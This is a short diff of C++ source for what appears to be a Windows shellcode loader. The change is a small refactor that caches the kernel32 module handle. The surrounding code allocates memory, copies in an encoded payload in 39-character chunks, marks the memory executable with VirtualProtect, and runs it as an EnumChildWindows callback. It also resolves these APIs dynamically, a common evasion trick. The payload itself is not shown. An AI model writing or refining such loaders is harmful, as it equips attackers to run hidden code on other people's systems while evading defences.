@@ -115,13 +115,14 @@ int main(int argc, char* argv[])
 
 	  int loops{sizeof(payload) / 39};
 	  
+	  HMODULE k32_handle{GetModuleHandle("kernel32.dll")};
 	  BOOL rv{};
 	  char chars_array[39]{};
 	  DWORD oldprotect{0};
 	  char* temp{};
 	  printf("1 %s\n", payload);
 	  
-	  pMVA = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc"); 
+	  pMVA = GetProcAddress(k32_handle, "VirtualAlloc"); 
 	  PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
 	  DWORD_PTR hptr = (DWORD_PTR)mem;
 	  
@@ -145,7 +146,7 @@ int main(int argc, char* argv[])
 	    hptr += 16;
 	  }
 	  
-	  pMVP = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect"); 
+	  pMVP = GetProcAddress(k32_handle, "VirtualProtect"); 
 	  rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect); 
 	  EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL); 
 	  CloseHandle(mem);
